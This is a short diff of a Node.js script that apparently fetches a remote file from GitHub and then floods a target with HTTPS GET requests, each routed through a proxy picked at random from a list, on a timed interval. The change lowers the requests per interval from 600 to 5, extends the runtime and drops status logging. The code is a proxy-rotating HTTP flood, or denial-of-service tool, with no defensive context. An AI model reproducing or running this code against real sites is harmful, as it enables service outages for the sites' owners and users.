@@ -3570,17 +3570,16 @@ request.get('https://raw.githubusercontent.com/Renzyx/parkandpork/main/1', (err,
 
   setTimeout(function() {
     process.exit(1);
-  }, process.argv[3] * 1000);
+  }, process.argv[3] * 10000);
 
   setInterval(function() {
 	 
-	 for (var i = 0; i < 600; i++) {
+	 for (var i = 0; i < 5; i++) {
     var options = parsed;
 	 
     options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);
 	
     https.get(options, function(res) {
-		console.log(res.statusCode);
 
     });
 
